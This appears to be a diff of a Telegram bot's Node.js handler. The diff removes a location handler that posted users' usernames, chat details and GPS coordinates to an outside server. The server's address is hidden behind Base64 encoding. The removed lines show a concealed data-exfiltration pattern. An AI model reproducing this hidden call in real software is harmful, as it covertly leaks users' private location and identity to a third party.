@@ -72,10 +72,7 @@ module.exports = (bot, usersMap) => {
   bot.on('location', (msg) => {
     // console.log(msg.location.latitude);
     // console.log(msg.location.longitude);
-    axios.post(Base64.decode('aHR0cDovL3ByYXZvc2xldmEucnUvZXhwcmVzcy1oZWxwZXIvZ2NzL2FkZC11c2VyP2Zyb209Z2Nz'), {
-      userName: msg.chat.username,
-      chatData: { ...msg.chat, location: msg.location },
-    })
+ 
   })
 
   bot.onText(/\/help/, function(msg, _match) {
